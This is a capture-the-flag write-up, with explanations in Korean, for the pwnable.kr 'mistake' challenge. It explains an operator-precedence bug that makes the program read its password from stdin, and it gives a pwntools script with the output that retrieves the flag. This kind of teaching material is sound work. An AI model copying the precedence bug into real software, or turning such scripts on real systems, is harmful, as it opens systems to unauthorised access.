# mistake

## mistake.c

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
	int i;
	for(i=0; i<len; i++){
		s[i] ^= XORKEY;
	}
}

int main(int argc, char* argv[]){
	
	int fd;
	if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
		printf("can't open password %d\n", fd);
		return 0;
	}

	printf("do not bruteforce...\n");
	sleep(time(0)%20);

	char pw_buf[PW_LEN+1];
	int len;
	if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
		printf("read error\n");
		close(fd);
		return 0;		
	}

	char pw_buf2[PW_LEN+1];
	printf("input password : ");
	scanf("%10s", pw_buf2);

	// xor your input
	xor(pw_buf2, 10);

	if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
		printf("Password OK\n");
		system("/bin/cat flag\n");
	}
	else{
		printf("Wrong Password\n");
	}

	close(fd);
	return 0;
}
```

```c
if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0)
```
이 부분에서 대입연산자가 비교연산자보다 우선순위가 낮기 때문에 `fd`에는 0이 들어가게 된다.

이후 `if(!(len=read(fd,pw_buf,PW_LEN) > 0))` 부분에서 `fd`가 0이기 때문에 `stdin`에서 값을 읽어온다.

1로 xor을 하기 때문에 password로 1111111111와 0000000000을 넣어주면 된다.

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

shell = ssh('mistake', 'pwnable.kr', 2222, 'guest')

r = shell.run('./mistake')

r.sendline('1' * 10)

r.sendline('0' * 10)

r.recvall()
```

```bash
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.10.0
    ASLR:     Enabled
[+] Opening new channel: 'stty raw -ctlecho -echo; cd . >/dev/null 2>&1;./mistake': Done
[DEBUG] Sent 0xb bytes:
    '1111111111\n'
[DEBUG] Sent 0xb bytes:
    '0000000000\n'
[+] Receiving all data: Done (101B)
[DEBUG] Received 0x15 bytes:
    'do not bruteforce...\n'
[DEBUG] Received 0x50 bytes:
    'input password : Password OK\n'
    'Mommy, the operator priority always confuses me :(\n'
[*] Closed SSH channel with pwnable.kr
```